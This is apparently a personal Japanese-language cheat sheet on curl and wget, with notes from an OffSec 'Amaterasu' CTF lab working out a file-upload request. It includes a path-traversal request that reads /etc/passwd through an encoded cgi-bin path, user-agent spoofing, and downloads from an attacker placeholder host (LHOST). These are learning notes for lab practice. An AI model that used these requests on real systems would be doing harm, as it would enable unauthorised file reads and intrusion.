---
title: Web操作
parent: Linux
grand_parent: General
nav_order: 5
---
<details markdown="1">

<summary>curl</summary>
```zsh
sudo curl -s --user-agent Googlebot http://192.168.143.14/robots.txt -v
```

```zsh
curl -X POST -F "file=@genai.pdf" http://localhost:5000/upload
```


```bash
curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
```
#### ファイルのアップロード
```bash
curl -F "file=@mydocument.pdf" https://example.com/upload
```


```bash
curl -i --path-as-is http://192.168.150.13:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```
- --path-as-is は curl のオプションで、URL のパス部分をそのまま送信するためのものです。
通常、curl はURLエンコードされた文字（例：%2e → .）を自動的にデコードしてから送信しますが、このオプションを使うとそれを無効化できます。

# Example 

## Road to Upload

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ curl -X POST --data './test.txt' http://192.168.231.249:33414/file-upload
{"message":"No file part in the request"}
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ curl -X POST -F './test.txt' http://192.168.231.249:33414/file-upload
Warning: Illegally formatted input field
curl: option -F: is badly used here
curl: try 'curl --help' or 'curl --manual' for more information
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ curl -X POST -F 'file=@./test.txt' http://192.168.231.249:33414/file-upload
{"message":"No filename part in the request"}
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ curl -X POST -F "file=@./test.txt" http://192.168.231.249:33414/file-upload
{"message":"No filename part in the request"}
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ curl -X POST -F "file=@test.txt" http://192.168.231.249:33414/file-upload 
{"message":"No filename part in the request"}
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ curl -X POST -F "file=@test.txt" http://192.168.231.249:40080/file-upload
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ curl -X POST -F "filename=@test.txt" http://192.168.231.249:33414/file-upload
{"message":"No file part in the request"}
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Amaterasu]
└─$ curl -X POST \
  -F "file=@test.txt" \
  -F "filename=test.txt" \
  http://192.168.231.249:33414/file-upload
{"message":"File successfully uploaded"}
```
</details>

<details markdown="1">

<summary>wget</summary>
### ファイルダウンロード

```bash
wget http://lhost/file
```

</details>